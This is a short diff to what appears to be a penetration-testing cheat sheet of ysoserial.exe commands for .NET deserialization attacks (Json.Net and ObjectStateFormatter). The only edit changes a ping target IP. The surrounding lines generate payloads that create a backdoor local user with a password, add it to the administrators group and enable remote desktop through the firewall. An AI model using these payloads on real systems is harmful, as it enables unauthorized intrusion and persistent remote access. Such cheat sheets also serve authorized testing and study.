@@ -39,7 +39,7 @@ ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /
 ```
 # Json Deserialization
 ```
-ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping 10.10.14.10" -o base64
+ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping 192.168.100.100" -o base64
 ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c net user MeMe 123456!@ /add " -o base64
 ysoserial.exe -g WindowsIdentity -f Json.Net -c "net localgroup administrators MeMe /add" -o base64
 ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes" -o base64
